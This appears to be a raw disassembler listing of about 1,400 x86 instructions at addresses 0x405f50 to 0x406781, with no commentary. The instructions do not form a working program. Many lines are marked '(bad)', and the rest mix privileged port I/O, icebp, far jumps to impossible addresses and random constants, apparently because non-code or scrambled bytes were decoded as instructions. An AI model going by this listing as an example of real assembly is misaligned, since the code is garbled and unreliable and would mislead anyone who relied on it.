  405f50:	adc    eax,0x3a59528b
  405f55:	mov    WORD PTR [edi-0x7e],gs
  405f58:	jmp    0x2255f693
  405f5d:	cld    
  405f5e:	sbb    dl,BYTE PTR [ebx]
  405f60:	sub    al,0x78
  405f62:	xchg   ebx,eax
  405f63:	sti    
  405f64:	icebp  
  405f65:	xchg   esi,eax
  405f66:	and    eax,0x95bf4430
  405f6b:	test   BYTE PTR [ecx],bl
  405f6d:	jp     0x405f2d
  405f6f:	call   0x86ea84a1
  405f74:	stos   DWORD PTR es:[edi],eax
  405f75:	jg     0x405f55
  405f77:	xchg   BYTE PTR [edi],al
  405f79:	add    DWORD PTR [eax+0x5c3fa8a],esi
  405f7f:	sub    al,0xb2
  405f81:	push   eax
  405f82:	add    DWORD PTR [ebx+0x2c36e66b],edx
  405f88:	pusha  
  405f89:	dec    esi
  405f8a:	in     eax,dx
  405f8b:	cmp    DWORD PTR [edi-0x4ec19b06],ebp
  405f91:	xor    DWORD PTR ds:0x59c3e468,ecx
  405f97:	retf   0x7fb4
  405f9a:	push   edx
  405f9b:	mov    bh,0x19
  405f9d:	test   eax,0x5abaad84
  405fa2:	jne    0x405f52
  405fa4:	inc    edx
  405fa5:	xor    esp,ebp
  405fa7:	repz es or al,0x5d
  405fab:	aas    
  405fac:	jnp    0x406026
  405fae:	test   BYTE PTR ds:0x2bf6dac7,ch
  405fb4:	fistp  DWORD PTR ds:0x1f1da62a
  405fba:	imul   edi,DWORD PTR [edi],0x24
  405fbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fbe:	or     eax,0x25f86b05
  405fc3:	and    ebp,DWORD PTR [edi-0x3d375001]
  405fc9:	iret   
  405fca:	jns    0x405f7e
  405fcc:	sbb    dl,0x8a
  405fcf:	mov    WORD PTR ds:0x5fa86eef,ds
  405fd5:	jb     0x405ff9
  405fd7:	in     eax,dx
  405fd8:	inc    ecx
  405fd9:	inc    esp
  405fda:	scas   al,BYTE PTR es:[edi]
  405fdb:	cmc    
  405fdc:	ins    BYTE PTR es:[edi],dx
  405fdd:	xchg   esi,eax
  405fde:	clc    
  405fdf:	mov    al,ds:0x1852e6f2
  405fe4:	push   ds
  405fe5:	iret   
  405fe6:	pxor   mm4,QWORD PTR [esp+eiz*8+0x56]
  405feb:	dec    eax
  405fec:	push   edi
  405fed:	je     0x405fdb
  405fef:	test   al,0x1e
  405ff1:	mov    dh,0x44
  405ff3:	enter  0xe93,0xea
  405ff7:	pop    eax
  405ff8:	lods   al,BYTE PTR ds:[esi]
  405ff9:	(bad)  
  405ffa:	retf   0x24de
  405ffd:	mov    dh,0xf5
  405fff:	popa   
  406000:	enter  0x106b,0x8b
  406004:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406006:	mov    edx,0x5be96cd1
  40600b:	or     eax,0x98a11cf4
  406010:	xchg   esi,eax
  406011:	stos   BYTE PTR es:[edi],al
  406012:	cwde   
  406013:	ss mov eax,esp
  406016:	retf   
  406017:	mov    esp,DWORD PTR [edx-0x47]
  40601a:	mov    eax,0xcf9c9659
  40601f:	das    
  406020:	mov    ch,0xd4
  406022:	out    dx,al
  406023:	stos   DWORD PTR es:[edi],eax
  406024:	or     esi,esi
  406026:	xchg   ebp,eax
  406027:	out    0x8d,al
  406029:	inc    ecx
  40602a:	mov    dh,0x3
  40602c:	pop    ebx
  40602d:	(bad)  
  40602e:	xlat   BYTE PTR ds:[ebx]
  40602f:	mov    esp,DWORD PTR [ecx+0x399380ba]
  406035:	stos   DWORD PTR es:[edi],eax
  406036:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406037:	pushf  
  406038:	adc    ch,cl
  40603a:	div    BYTE PTR [esi+0x5e2c4f66]
  406040:	in     al,dx
  406041:	rcr    BYTE PTR [edx+0x11f36d75],cl
  406047:	inc    ecx
  406048:	cmp    ecx,eax
  40604a:	mov    ds,WORD PTR [ebx+0x61]
  40604d:	push   es
  40604e:	cld    
  40604f:	xchg   esi,eax
  406050:	sbb    esi,DWORD PTR [edx]
  406052:	ss and esp,esp
  406055:	push   es
  406056:	jl     0x405fdf
  406058:	or     eax,0x22d86a40
  40605d:	test   eax,0xad187654
  406062:	adc    BYTE PTR [ebx+0x50],al
  406065:	call   0xc58139b8
  40606a:	imul   edi,DWORD PTR [eax],0x229e492b
  406070:	(bad)  
  406071:	leave  
  406072:	inc    esi
  406073:	xchg   edi,eax
  406074:	jle    0x406040
  406076:	jb     0x406075
  406078:	out    0x5a,al
  40607a:	or     eax,0x35f4736e
  40607f:	mov    eax,0x1959bc9c
  406084:	lock and BYTE PTR [ecx+0x3dc9ea9b],cl
  40608b:	sbb    BYTE PTR [esi],0xd6
  40608e:	pop    edx
  40608f:	pop    esi
  406090:	mov    edi,0xf70cb6fc
  406095:	mov    ch,0x50
  406097:	push   eax
  406098:	daa    
  406099:	fs dec edx
  40609b:	mov    WORD PTR [ecx-0x34],ds
  40609e:	bound  esp,QWORD PTR [ebp+0x378ba1c8]
  4060a4:	jmp    0xc37f:0x1ea63317
  4060ab:	mov    cl,ah
  4060ad:	cmp    DWORD PTR [eax+0x58],edx
  4060b0:	out    dx,al
  4060b1:	in     al,dx
  4060b2:	push   0xffffffd1
  4060b4:	and    DWORD PTR [esp+ebx*8-0x43903121],ebp
  4060bb:	jle    0x4060a4
  4060bd:	jbe    0x4060bb
  4060bf:	loop   0x406091
  4060c1:	xor    al,0x40
  4060c3:	cwde   
  4060c4:	lods   eax,DWORD PTR ds:[esi]
  4060c5:	jle    0x406130
  4060c7:	in     al,0xae
  4060c9:	mov    dl,0xf7
  4060cb:	in     eax,0xde
  4060cd:	mov    edi,0xf1176fdb
  4060d2:	out    dx,al
  4060d3:	pop    esp
  4060d4:	mov    ch,dh
  4060d6:	call   0x54a24ce4
  4060db:	(bad)  
  4060dc:	push   edi
  4060dd:	mov    ?,WORD PTR [ebp-0x56]
  4060e0:	jl     0x406143
  4060e2:	out    0x7f,eax
  4060e4:	sub    al,0x45
  4060e6:	add    DWORD PTR [edi-0x61ed6287],edi
  4060ec:	sub    BYTE PTR gs:[ebx-0x2685737f],0x39
  4060f4:	ret    0xcee6
  4060f7:	(bad)  
  4060f8:	sbb    eax,0xc1529929
  4060fd:	mov    esi,ebp
  4060ff:	xor    BYTE PTR [edx+0x5979bf5],dl
  406105:	inc    ebp
  406106:	clc    
  406107:	stc    
  406108:	sar    ah,cl
  40610a:	mov    al,0x27
  40610c:	xchg   esi,eax
  40610d:	shl    DWORD PTR [edi+0x29fa7857],0x8d
  406114:	jae    0x406192
  406116:	and    DWORD PTR [ebx-0x760bedb8],0xf641b00e
  406120:	daa    
  406121:	dec    esp
  406122:	mov    al,0xd1
  406124:	mov    BYTE PTR [ebp+0x714eb4bd],dh
  40612a:	push   es
  40612b:	mov    al,0x7d
  40612d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40612e:	idiv   DWORD PTR [ebx-0x232e293b]
  406134:	jp     0x4060ea
  406136:	pop    edi
  406137:	add    al,0xe
  406139:	les    eax,FWORD PTR [ebp-0x4d]
  40613c:	imul   ebx,DWORD PTR [edx],0x4d91dcc
  406142:	mov    dl,0x4c
  406144:	gs xchg edx,eax
  406146:	add    dh,BYTE PTR [ecx+eax*1-0x65e9856]
  40614d:	aad    0xe2
  40614f:	jmp    0x4060d7
  406151:	mov    eax,ds:0x7c762976
  406156:	jg     0x4061bf
  406158:	sti    
  406159:	mov    ebx,0x2816198c
  40615e:	and    dh,al
  406160:	sbb    DWORD PTR [ecx+0x3e659ed7],esi
  406166:	pop    ebp
  406167:	lock std 
  406169:	mov    ebx,0x299a55f3
  40616e:	ds mov dl,0xb7
  406171:	jl     0x406172
  406173:	arpl   WORD PTR [edi-0x3b],cx
  406176:	sbb    bh,al
  406178:	or     BYTE PTR [ebp-0x5830acc],dh
  40617e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40617f:	cmp    ecx,esi
  406181:	xor    BYTE PTR [edi],dl
  406183:	icebp  
  406184:	mov    bl,BYTE PTR [edx+0x6bdc9aab]
  40618a:	pop    edx
  40618b:	(bad)  
  40618c:	push   eax
  40618d:	push   ebp
  40618e:	cmp    eax,eax
  406190:	enter  0xfe1f,0xdf
  406194:	xchg   DWORD PTR [ebx+ecx*1-0x1],esp
  406198:	jge    0x406194
  40619a:	lahf   
  40619b:	idiv   BYTE PTR [ecx-0x7f]
  40619e:	add    al,0x5a
  4061a0:	repnz repz push ebx
  4061a3:	fmul   DWORD PTR [ebx+0x4d]
  4061a6:	push   esp
  4061a7:	mov    bh,0xa9
  4061a9:	aaa    
  4061aa:	arpl   WORD PTR [edx+0x2b],sp
  4061ad:	xchg   ebp,eax
  4061ae:	enter  0x55bc,0xff
  4061b2:	or     ecx,DWORD PTR [eax-0x30cfb4af]
  4061b8:	sti    
  4061b9:	fistp  WORD PTR [edi-0x79449965]
  4061bf:	sbb    al,BYTE PTR ds:0x451f2642
  4061c5:	add    al,0x4a
  4061c7:	dec    ebp
  4061c8:	ret    
  4061c9:	dec    edx
  4061ca:	aas    
  4061cb:	gs pop ebp
  4061cd:	jbe    0x406230
  4061cf:	xor    al,0x9d
  4061d1:	pop    edx
  4061d2:	mov    edi,0x5c1cd158
  4061d7:	pop    ds
  4061d8:	js     0x40621a
  4061da:	mov    es,esp
  4061dc:	xchg   ecx,eax
  4061dd:	nop
  4061de:	push   cs
  4061df:	xrelease mov DWORD PTR [ebx-0xe],edi
  4061e3:	repnz add eax,DWORD PTR [esi-0x4f]
  4061e7:	aam    0xce
  4061e9:	in     eax,dx
  4061ea:	xor    ebx,eax
  4061ec:	out    dx,al
  4061ed:	outs   dx,BYTE PTR ds:[esi]
  4061ee:	sbb    eax,0xe211263f
  4061f3:	cwde   
  4061f4:	loop   0x406235
  4061f6:	call   0xbd5cee5e
  4061fb:	mov    ds:0xb289273b,eax
  406200:	add    DWORD PTR [edx-0x55030325],0x56
  406207:	leave  
  406208:	in     al,0xe7
  40620a:	lock jae 0x4061f6
  40620d:	fwait
  40620e:	scas   al,BYTE PTR es:[edi]
  40620f:	and    eax,0x4832a2c7
  406214:	adc    DWORD PTR [edi],ecx
  406216:	(bad)  
  406217:	and    BYTE PTR [eax+0x46],al
  40621a:	mov    esi,eax
  40621c:	lds    esi,FWORD PTR [ecx+0xb]
  40621f:	or     DWORD PTR [eax+edi*1],ebp
  406222:	leave  
  406223:	mov    al,ds:0xd46d9e0a
  406228:	repz iret 
  40622a:	(bad)  
  40622b:	stos   BYTE PTR es:[edi],al
  40622c:	popf   
  40622d:	sub    DWORD PTR [esi-0x3b],0x1a
  406231:	les    edi,FWORD PTR [ebp+ecx*2+0x2e]
  406235:	pop    ebx
  406236:	aam    0x1a
  406238:	bound  eax,QWORD PTR [edx+0x6f0547e1]
  40623e:	loop   0x406292
  406240:	jle    0x406206
  406242:	jecxz  0x406202
  406244:	rcr    BYTE PTR [edi+0x1c107486],cl
  40624a:	les    edx,FWORD PTR ss:[ebx-0x7a]
  40624e:	cld    
  40624f:	call   0x7ead3452
  406254:	lods   eax,DWORD PTR ds:[esi]
  406255:	dec    ebp
  406256:	and    eax,0xb51bad25
  40625b:	or     eax,0x57b7af3c
  406260:	dec    ebx
  406261:	ins    BYTE PTR es:[edi],dx
  406262:	fs daa 
  406264:	add    ebx,DWORD PTR [ecx+0x5bf20865]
  40626a:	inc    ebx
  40626b:	mov    eax,ds:0x472fc19b
  406270:	cmp    ah,BYTE PTR [ecx+0x3]
  406273:	(bad)
  406277:	mov    al,0xf8
  406279:	jae    0x4062a6
  40627b:	sub    edx,DWORD PTR [edi+0x2e61d175]
  406281:	repz jl 0x4062d7
  406284:	inc    ebp
  406285:	jp     0x406302
  406287:	sbb    bh,BYTE PTR [ebx+0x4e]
  40628a:	mov    esi,0x66476a10
  40628f:	pop    ebp
  406290:	adc    BYTE PTR [ecx+0x13476ac8],al
  406296:	ins    DWORD PTR es:[edi],dx
  406297:	retf   
  406298:	push   0x2c
  40629a:	jg     0x4062c3
  40629c:	sub    BYTE PTR [ebx],0x8e
  40629f:	pushw  0x6fd
  4062a3:	push   0xffffffac
  4062a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4062a6:	shl    BYTE PTR ds:[edx],0xb6
  4062aa:	fsub   DWORD PTR [esi]
  4062ac:	mov    al,ds:0xade73994
  4062b1:	mov    ss,WORD PTR [ecx]
  4062b3:	mov    ch,0x4a
  4062b5:	push   edi
  4062b6:	icebp  
  4062b7:	mov    ds:0x8d698176,al
  4062bc:	test   DWORD PTR [esi-0xc],ebx
  4062bf:	mov    eax,ds:0x4d5e0a
  4062c4:	jnp    0x4062ff
  4062c6:	mov    bh,BYTE PTR [ecx+0x6a755902]
  4062cc:	inc    esi
  4062cd:	in     al,0xde
  4062cf:	mov    ebp,0x4c53e067
  4062d4:	cmp    ch,BYTE PTR [edi-0x5fe4500c]
  4062da:	(bad)  
  4062db:	push   cs
  4062dc:	sub    BYTE PTR [esp+eax*4-0x74],cl
  4062e0:	int3   
  4062e1:	sbb    BYTE PTR [eax-0x8],dl
  4062e4:	fiadd  DWORD PTR [ebx]
  4062e6:	sub    eax,0x4fd5526d
  4062eb:	or     bh,bl
  4062ed:	aam    0x5c
  4062ef:	mov    cl,0x5b
  4062f1:	ds push es
  4062f3:	(bad)  
  4062f4:	loop   0x4062f5
  4062f6:	icebp  
  4062f7:	mov    ebp,0xe41b89f8
  4062fc:	xor    eax,0x3ed532c
  406301:	cs icebp 
  406303:	loope  0x406351
  406305:	(bad)  
  406306:	cmp    al,0x78
  406308:	and    eax,0xc69a6f6d
  40630d:	fs repz xchg edx,eax
  406310:	add    dl,cl
  406312:	arpl   si,bp
  406314:	enter  0x23c1,0x89
  406318:	pop    esi
  406319:	stos   BYTE PTR es:[edi],al
  40631a:	sbb    esp,DWORD PTR [ebx-0x26d2aa4f]
  406320:	lods   al,BYTE PTR ds:[esi]
  406321:	cmp    dl,dl
  406323:	add    dl,ah
  406325:	and    BYTE PTR [eax+esi*1+0x24421c2],dl
  40632c:	enter  0xae12,0xa5
  406330:	adc    bl,ah
  406332:	dec    esi
  406333:	icebp  
  406334:	dec    esp
  406335:	add    eax,0x7661c18e
  40633a:	add    al,0x89
  40633c:	xchg   esi,eax
  40633d:	push   edx
  40633e:	sbb    esp,ebp
  406340:	inc    eax
  406341:	mov    eax,0x478d27af
  406346:	jae    0x4063a9
  406348:	sub    ebx,edx
  40634a:	inc    ecx
  40634b:	jnp    0x40630f
  40634d:	dec    edi
  40634e:	adc    eax,0x70d94924
  406353:	and    DWORD PTR [edx-0x5eb36b37],edx
  406359:	lahf   
  40635a:	jnp    0x40639f
  40635c:	mov    ds:0xee684993,eax
  406361:	sub    cl,dl
  406363:	out    0xfc,al
  406365:	add    eax,0xcc1da935
  40636a:	adc    DWORD PTR [ecx-0xcb334c3],edi
  406370:	and    DWORD PTR [eax],esp
  406372:	xchg   ecx,eax
  406373:	je     0x406357
  406375:	jmp    0x406368
  406377:	addr16 arpl ax,cx
  40637a:	(bad)  
  40637b:	sti    
  40637c:	ins    BYTE PTR es:[edi],dx
  40637d:	shl    dh,cl
  40637f:	std    
  406380:	sub    eax,0xce5261d9
  406385:	xchg   ebp,eax
  406386:	mov    ds:0xbf5e22f6,al
  40638b:	or     ebx,DWORD PTR [ecx+0x64417a73]
  406391:	out    0x2d,al
  406393:	aam    0x2d
  406395:	jecxz  0x406399
  406397:	ror    al,cl
  406399:	inc    ebx
  40639a:	fidivr DWORD PTR ds:[ebx+eiz*8+0x2d]
  40639f:	jle    0x4063c6
  4063a1:	fdiv   QWORD PTR [ebx-0x4c]
  4063a4:	clc    
  4063a5:	pop    esp
  4063a6:	mov    WORD PTR [ebx],?
  4063a8:	lods   al,BYTE PTR ds:[esi]
  4063a9:	fldenv [esi+edi*2]
  4063ac:	(bad)  
  4063ad:	and    al,ch
  4063af:	xor    eax,0x38810d34
  4063b4:	jl     0x406389
  4063b6:	mov    cl,0x73
  4063b8:	push   ebx
  4063b9:	daa    
  4063ba:	jae    0x4063a8
  4063bc:	cld    
  4063bd:	sbb    eax,esi
  4063bf:	jecxz  0x4063af
  4063c1:	mov    edi,0xaaeef333
  4063c6:	sub    edi,edx
  4063c8:	or     al,0xc3
  4063ca:	push   esi
  4063cb:	or     DWORD PTR [eax+eax*4+0x62],esi
  4063cf:	into   
  4063d0:	pushf  
  4063d1:	mov    ds:0x984be371,al
  4063d6:	out    0xa4,eax
  4063d8:	fld    st(0)
  4063da:	xor    ah,BYTE PTR [eax]
  4063dc:	loopne 0x4063a5
  4063de:	repnz push esi
  4063e0:	push   edi
  4063e1:	or     dh,BYTE PTR [eax-0x75]
  4063e4:	sbb    bh,bh
  4063e6:	mov    esi,0x7eb4776d
  4063eb:	pop    ebp
  4063ec:	gs sahf 
  4063ee:	or     al,0x24
  4063f0:	cwde   
  4063f1:	dec    edx
  4063f2:	ins    BYTE PTR es:[edi],dx
  4063f3:	loopne 0x4063df
  4063f5:	mov    ebp,0x50f1b8c7
  4063fa:	or     esp,DWORD PTR [edi]
  4063fc:	xchg   edx,eax
  4063fd:	mov    ecx,esi
  4063ff:	pop    edx
  406400:	dec    edi
  406401:	mul    BYTE PTR [ecx]
  406403:	cmp    BYTE PTR [edx+esi*2],0x5f
  406407:	cmp    al,0xb2
  406409:	cmp    BYTE PTR [edx],bl
  40640b:	cld    
  40640c:	jp     0x4063f8
  40640e:	ins    DWORD PTR es:[edi],dx
  40640f:	push   0x22
  406411:	retf   
  406412:	(bad)  
  406413:	outs   dx,BYTE PTR ds:[esi]
  406414:	stos   DWORD PTR es:[edi],eax
  406415:	test   BYTE PTR [esi+0x40],al
  406418:	sar    BYTE PTR [ecx+ebx*4],0xa8
  40641c:	cmc    
  40641d:	pop    ecx
  40641e:	pop    ebp
  40641f:	hlt    
  406420:	daa    
  406421:	mov    edi,0x9b9c016c
  406426:	xchg   esp,eax
  406427:	sub    eax,0x2e8b9a66
  40642c:	ins    DWORD PTR es:[edi],dx
  40642d:	jge    0xbb02ab66
  406433:	call   0x5bfa:0x64401ece
  40643a:	jbe    0x40646c
  40643c:	xor    BYTE PTR [eax],cl
  40643e:	pop    edx
  40643f:	ds mov bl,bh
  406442:	mov    ebx,esp
  406444:	xor    BYTE PTR [ebx],0xe5
  406447:	push   edi
  406448:	cs mov ah,0x9a
  40644b:	sbb    eax,0x91c5ede6
  406450:	daa    
  406451:	dec    ebp
  406452:	aas    
  406453:	js     0x406421
  406455:	lds    edx,FWORD PTR [edx]
  406457:	imul   ebp,DWORD PTR [eax-0x73a67de7],0x2a28ab1d
  406461:	sbb    eax,0x2370999b
  406466:	jb     0x406421
  406468:	sbb    BYTE PTR [edx],bh
  40646a:	mov    eax,0x8a89498
  40646f:	add    BYTE PTR [esi-0x2204530c],dl
  406475:	and    eax,DWORD PTR [eax+edx*1-0xe1d906c]
  40647c:	bound  esp,QWORD PTR [ebx]
  40647e:	fisubr WORD PTR [esi-0x4ecc8c5e]
  406484:	movlhps xmm2,xmm7
  406487:	push   cs
  406488:	imul   esp,DWORD PTR [ecx+esi*2],0xfffffffa
  40648c:	or     edi,0xffffffc9
  40648f:	mov    eax,ds:0xddf6d5b5
  406494:	pop    esp
  406495:	lods   al,BYTE PTR ds:[esi]
  406496:	jp     0x406479
  406498:	sub    al,0x19
  40649a:	sbb    BYTE PTR [ecx-0x75c0083c],dl
  4064a0:	jae    0x406422
  4064a2:	aam    0xc3
  4064a4:	stos   BYTE PTR es:[edi],al
  4064a5:	adc    ah,ch
  4064a7:	es jmp 0x406498
  4064aa:	neg    BYTE PTR [eax+0x2a]
  4064ad:	popf   
  4064ae:	mov    ds,WORD PTR [eax]
  4064b0:	push   eax
  4064b1:	stc    
  4064b2:	(bad)  
  4064b3:	or     al,BYTE PTR [edi-0x3eee1fb1]
  4064b9:	inc    esi
  4064ba:	push   0xffffffa8
  4064bc:	shl    DWORD PTR [edx],1
  4064be:	add    BYTE PTR [eax],cl
  4064c0:	ror    BYTE PTR [edi+edi*1+0x6f],cl
  4064c4:	dec    esi
  4064c5:	mov    ecx,0xae0bda9d
  4064ca:	fiadd  DWORD PTR [ebx-0x46]
  4064cd:	jp     0x40648a
  4064cf:	mov    ebx,DWORD PTR [esp+ebp*1]
  4064d2:	adc    dh,BYTE PTR ds:0x5a053009
  4064d8:	add    ch,bl
  4064da:	mov    ecx,0x3981bcc6
  4064df:	aas    
  4064e0:	push   edx
  4064e1:	mov    dh,cl
  4064e3:	mov    eax,DWORD PTR [ebp+ebx*2-0x19336e15]
  4064ea:	add    DWORD PTR [ebp-0x1c],esi
  4064ed:	mov    bh,0xc6
  4064ef:	mov    ebp,DWORD PTR [esi-0x8cd3c4]
  4064f5:	rcr    DWORD PTR [ebp+0x35648565],cl
  4064fb:	lea    esi,[eax-0x48]
  4064fe:	fnstcw WORD PTR [ecx+0x79bcc7de]
  406504:	call   0xfe73:0x83fcdcf2
  40650b:	lds    ecx,FWORD PTR [edx+ebx*4]
  40650e:	inc    esp
  40650f:	jmp    0x4064e6
  406511:	adc    BYTE PTR [eax],ah
  406513:	gs pop esp
  406515:	adc    edi,DWORD PTR [ebp+0x7035786f]
  40651b:	loope  0x4064ac
  40651d:	loopne 0x40650d
  40651f:	gs loopne 0x406518
  406522:	(bad)  
  406523:	fs out 0x18,eax
  406526:	inc    esp
  406527:	mov    ebx,0x83bd59de
  40652c:	ret    
  40652d:	mov    ds:0xe41aef4b,eax
  406532:	push   eax
  406533:	scas   eax,DWORD PTR es:[edi]
  406534:	xor    dh,dh
  406536:	stos   DWORD PTR es:[edi],eax
  406537:	mov    ecx,0xb61812d
  40653c:	pushf  
  40653d:	mov    ecx,0xb160d899
  406542:	(bad)  
  406544:	mov    ds,WORD PTR [eax-0x65d2ae19]
  40654a:	mov    al,0x17
  40654c:	mov    ?,WORD PTR [edi+0x7a]
  40654f:	in     eax,0xe0
  406551:	aam    0x27
  406553:	inc    edi
  406554:	or     eax,eax
  406556:	lods   eax,DWORD PTR ds:[esi]
  406557:	add    al,0x22
  406559:	in     al,0xa3
  40655b:	push   0x76
  40655d:	aaa    
  40655e:	sub    edx,DWORD PTR [ecx]
  406560:	ja     0x4065ab
  406562:	pop    edx
  406563:	adc    al,0x2d
  406565:	add    al,0x6b
  406567:	imul   edi,DWORD PTR [esp+ebx*1],0x50
  40656b:	fwait
  40656c:	adc    ah,BYTE PTR [ebp+ebx*4-0x3f]
  406570:	iret   
  406571:	jmp    0x4f5c29d1
  406576:	mov    cl,ch
  406578:	mov    eax,0x12b930c1
  40657d:	mov    dh,0x83
  40657f:	mov    ebx,0x6d7a704a
  406584:	push   0x6fa87bd1
  406589:	(bad)  
  40658a:	std    
  40658b:	mov    bl,0x49
  40658d:	call   FWORD PTR ss:[ebx]
  406590:	mov    dl,0xd4
  406592:	out    0xdd,eax
  406594:	je     0x40651c
  406596:	popf   
  406597:	cmp    eax,0xd302ea33
  40659c:	dec    ecx
  40659d:	stc    
  40659e:	adc    al,0xf5
  4065a0:	jle    0x4065de
  4065a2:	adc    eax,0x6d888b5e
  4065a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065a8:	xchg   BYTE PTR [ecx+0x5d],dh
  4065ab:	mov    dl,0xa9
  4065ad:	shr    BYTE PTR [esi-0x76],1
  4065b0:	test   al,0x76
  4065b2:	fistp  QWORD PTR [edi+edx*2]
  4065b5:	(bad)  
  4065b6:	or     al,0xab
  4065b8:	inc    ebx
  4065b9:	int    0xc3
  4065bb:	xchg   BYTE PTR [ecx],bh
  4065bd:	mov    BYTE PTR [eax+edx*2+0x6520fbc1],bh
  4065c4:	call   0x93f6:0x5c787dc4
  4065cb:	aam    0x5d
  4065cd:	mov    edi,0x55e5a5b3
  4065d2:	shr    DWORD PTR [ecx-0x35],cl
  4065d5:	repnz pusha 
  4065d7:	xor    DWORD PTR [edx+0x8],edx
  4065da:	mov    edi,0xa8fd5cfb
  4065df:	adc    esp,esp
  4065e1:	mov    eax,0x910a54a
  4065e6:	gs stos BYTE PTR es:[edi],al
  4065e8:	icebp  
  4065e9:	push   cs
  4065ea:	inc    ebp
  4065eb:	mov    edi,ss
  4065ed:	mov    ebx,0x95b818e6
  4065f2:	lahf   
  4065f3:	out    0x9c,eax
  4065f5:	jbe    0x406577
  4065f7:	loopne 0x4065f2
  4065f9:	xlat   BYTE PTR ds:[ebx]
  4065fa:	imul   ebp,DWORD PTR [ebp-0x5f],0xa63514a4
  406601:	xor    esp,DWORD PTR [ecx+0x623b5bc0]
  406607:	lods   eax,DWORD PTR ds:[esi]
  406608:	mov    ch,0x76
  40660a:	inc    ebp
  40660b:	les    eax,FWORD PTR [ecx]
  40660d:	loop   0x406625
  40660f:	push   0xdbcc1d06
  406614:	jae    0x40663d
  406616:	push   esp
  406617:	dec    eax
  406618:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406619:	add    eax,0x2b48951d
  40661e:	scas   eax,DWORD PTR es:[edi]
  40661f:	and    BYTE PTR [ecx+eax*4+0x1c],bh
  406623:	addr16 fst st(4)
  406626:	mov    ch,0x18
  406628:	xor    al,BYTE PTR [eax-0x135a6b2f]
  40662e:	test   esp,esp
  406630:	sbb    DWORD PTR ds:0x5f85f45c,ebp
  406636:	cmp    al,0xfd
  406638:	stos   BYTE PTR es:[edi],al
  406639:	jnp    0x4066a3
  40663b:	or     ch,dl
  40663d:	add    DWORD PTR [edx],esi
  40663f:	clc    
  406640:	pop    DWORD PTR [ecx]
  406642:	jp     0x4066aa
  406644:	les    ecx,FWORD PTR [esi-0x7b]
  406647:	stos   DWORD PTR es:[edi],eax
  406648:	and    DWORD PTR [eax+0x5fafcf01],esp
  40664e:	ficom  WORD PTR [edi+0x2d]
  406651:	repz pop edx
  406653:	hlt    
  406654:	adc    dl,BYTE PTR [ecx]
  406656:	push   esp
  406657:	jge    0x406659
  406659:	std    
  40665a:	jb     0x406636
  40665c:	inc    ebp
  40665d:	jb     0x406689
  40665f:	sbb    ecx,ecx
  406661:	mov    esi,0x9e4f4986
  406666:	mov    esi,0x2b4b5028
  40666b:	jl     0x406666
  40666d:	mov    ecx,0xe4afae85
  406672:	mov    ebp,0x4c416a8d
  406677:	or     DWORD PTR [edx-0x3fed5080],esp
  40667d:	cmp    edx,DWORD PTR [esp+eax*2+0x6fc5fed2]
  406684:	and    BYTE PTR [eax+ecx*8+0x6498e3c2],cl
  40668b:	gs dec ebx
  40668d:	lds    eax,FWORD PTR [edx+esi*8]
  406690:	nop
  406691:	cwde   
  406692:	sub    ebp,DWORD PTR [edi]
  406694:	bound  ecx,QWORD PTR [ecx+0x4a]
  406697:	mov    ecx,0xd9c06869
  40669c:	bnd ret 
  40669e:	or     BYTE PTR [edx+ebp*2-0x17],0xeb
  4066a3:	sub    al,0x54
  4066a5:	mov    bh,0xd
  4066a7:	lods   eax,DWORD PTR ds:[esi]
  4066a8:	mov    ecx,0x3c40f90b
  4066ad:	mov    ds:0xe0f70306,eax
  4066b2:	out    dx,eax
  4066b3:	inc    ecx
  4066b4:	push   esi
  4066b5:	push   edi
  4066b6:	cmp    edx,DWORD PTR [ecx+0x528ab5fc]
  4066bc:	sbb    BYTE PTR [edx+0x607de962],ch
  4066c2:	dec    eax
  4066c3:	sub    ebx,esi
  4066c5:	shr    BYTE PTR [edi-0x21],0xe8
  4066c9:	test   eax,0x4f131c7b
  4066ce:	fstp   DWORD PTR [ecx-0x568a50ca]
  4066d4:	sti    
  4066d5:	dec    ecx
  4066d6:	mov    eax,ds:0xddd34de6
  4066db:	or     BYTE PTR [ebp+0x207f16e6],dl
  4066e1:	mov    ebp,0xd49ee5fc
  4066e6:	test   bl,dl
  4066e8:	shl    DWORD PTR [esi],1
  4066ea:	xchg   ebp,eax
  4066eb:	adc    eax,0xf85dcd78
  4066f0:	outs   dx,BYTE PTR ds:[esi]
  4066f1:	xchg   dh,dh
  4066f3:	js     0x4066c6
  4066f5:	hlt    
  4066f6:	es or  ecx,edx
  4066f9:	loop   0x4066d6
  4066fb:	ret    0x9d04
  4066fe:	test   BYTE PTR [ecx+0x1a6951fa],al
  406704:	pop    edi
  406705:	sbb    al,0xd0
  406707:	pop    eax
  406708:	adc    ecx,ebx
  40670a:	adc    esi,DWORD PTR ds:0x53b07e12
  406710:	and    edx,eax
  406712:	fdiv   QWORD PTR [edx-0x35a74ce8]
  406718:	sub    DWORD PTR [ebx+0x57f9d869],esi
  40671e:	mov    ds:0x8ce4ff0f,ax
  406724:	lea    ecx,[edx-0x590a4d2d]
  40672a:	aas    
  40672b:	fnstenv [edi+0x7c]
  40672e:	dec    edi
  40672f:	cld    
  406730:	idiv   al
  406732:	fs repz jle 0x4066f0
  406736:	dec    edx
  406737:	jecxz  0x40678f
  406739:	add    eax,0xd0871cb9
  40673e:	jp     0x40677c
  406740:	retf   
  406741:	loop   0x4066d3
  406743:	enter  0xc283,0x93
  406747:	cmp    eax,0x19e09520
  40674c:	jbe    0x4067b3
  40674e:	jnp    0x40672c
  406750:	add    al,0x47
  406752:	(bad)
  406755:	pop    ebp
  406756:	pop    ecx
  406757:	scas   al,BYTE PTR es:[edi]
  406758:	dec    edx
  406759:	dec    esp
  40675a:	xor    eax,0x4725d9df
  40675f:	xchg   ebp,eax
  406760:	loop   0x4066f8
  406762:	shl    BYTE PTR [esi+0x75d1f07f],cl
  406768:	ret    0xa44e
  40676b:	arpl   WORD PTR [esi-0x69f85137],di
  406771:	jle    0x406700
  406773:	sbb    al,0xd
  406776:	sub    eax,0xe9b21b22
  40677b:	out    0xec,eax
  40677d:	ror    BYTE PTR [edi+eiz*2+0x38],cl
  406781:	cmp    al,0x81
